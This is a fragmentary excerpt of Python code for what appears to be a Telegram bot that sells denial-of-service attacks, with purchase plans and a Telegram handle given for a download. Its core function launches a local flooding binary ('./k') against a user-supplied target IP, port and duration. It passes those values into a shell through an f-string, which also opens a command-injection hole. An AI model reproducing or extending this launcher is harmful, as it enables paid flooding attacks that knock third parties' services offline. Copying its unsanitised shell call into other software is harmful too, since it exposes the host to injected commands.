...
FORWARD_CHANNEL_ID = -1002248854532
CHANNEL_ID = -1002248854532
error_channel_id = -1002248854532
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./k {target_ip} {target_port} {duration} 300")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: @void_fy*", parse_mode='Markdown')
